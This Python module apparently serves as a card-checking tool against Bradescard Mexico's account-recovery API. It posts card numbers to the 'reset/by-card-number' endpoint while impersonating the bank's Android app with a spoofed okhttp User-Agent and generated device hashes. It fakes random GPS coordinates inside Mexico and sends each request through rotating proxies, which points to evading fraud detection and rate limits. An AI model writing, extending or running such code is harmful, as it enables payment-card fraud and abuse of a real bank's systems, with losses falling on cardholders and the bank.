import asyncio
import json
import random
import uuid
from typing import Any, Dict, Optional

import aiohttp

from config import PROXY_URL, REQUEST_TIMEOUT_SECONDS
from device_hash_generator import generate_x_device_hash
from proxy_handler import get_rotating_proxy


class BradesAPI:
    BASE_URL = "https://apisprod.bradescard.com.mx/GatewayMS"
    FILTER_URL = f"{BASE_URL}/RecuperacionAccesoClienteMS/v1/reset/by-card-number"

    @staticmethod
    def get_headers(device_uuid: str) -> Dict[str, str]:
        return {
            "Accept": "*/*",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/5.0.0-alpha.11",
            "Connection": "keep-alive",
            "Platform": "android",
            "X-Device-Hash": generate_x_device_hash(device_uuid),
        }

    @staticmethod
    async def filter_card(encrypted_card: str, proxy_url: Optional[str] = None) -> Optional[Dict[str, Any]]:
        device_uuid = str(uuid.uuid4())
        headers = BradesAPI.get_headers(device_uuid)

        payload = {
            "cardNumber": encrypted_card,
            "deviceId": device_uuid,
            "latitude": round(random.uniform(19.0, 32.0), 7),
            "longitude": round(random.uniform(-118.0, -86.0), 7),
            "origin": "APP",
            "type": "RECOVER",
        }

        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT_SECONDS)
        proxy_dict = get_rotating_proxy() if proxy_url is None else {"http": proxy_url, "https": proxy_url}
        proxy_target = proxy_dict.get("http") or proxy_url or PROXY_URL

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(
                BradesAPI.FILTER_URL,
                headers=headers,
                json=payload,
                proxy=proxy_target,
            ) as response:
                if response.status == 200:
                    text = await response.text()
                    try:
                        return json.loads(text)
                    except json.JSONDecodeError:
                        return {"description": "", "code": -1, "raw": text}

                text = await response.text()
                return {
                    "description": "",
                    "code": response.status,
                    "raw": text,
                }
